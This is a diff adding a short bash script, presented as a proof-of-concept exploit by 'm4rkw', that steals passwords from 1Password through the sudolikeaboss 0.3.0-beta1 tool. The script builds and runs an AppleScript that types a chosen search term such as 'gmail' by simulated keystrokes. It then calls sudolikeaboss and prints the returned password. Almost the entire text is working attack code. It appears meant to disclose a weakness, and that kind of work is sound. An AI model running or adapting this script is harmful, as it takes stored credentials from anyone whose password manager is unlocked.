@@ -1,0 +1,40 @@
+#!/bin/bash
+
+####################################################
+# sudolikeaboss 0.3.0-beta1 password theft exploit #
+####################################################
+# by m4rkw,  shouts to #coolkids :P                #
+####################################################
+
+# sudolikeaboss is very convenient but convenience is often a tradeoff
+# for security.  This PoC demonstrates password theft when 1password
+# is in an unlocked state.
+#
+# The parameter will be used to search 1password and return the first
+# matching result.  A good choice would be "twitter" or "gmail".
+
+if [ "$1" == "" ] ; then
+  echo "Usage: $0 <1password search string>"
+  exit 0
+fi
+
+cat > sudo_as.txt <<EOF
+delay 0.3
+tell application "System Events"
+EOF
+
+echo "$1" | fold -w1 |sed 's/^/  keystroke "/g' |sed 's/$/"/g' >> sudo_as.txt
+
+cat >> sudo_as.txt <<EOF
+  delay 0.5
+  key code 36
+end tell
+EOF
+
+osacompile -o sudo_as.scpt sudo_as.txt
+
+osascript "./sudo_as.scpt" &
+
+pass=`sudolikeaboss`
+
+echo "Password stolen: $pass"
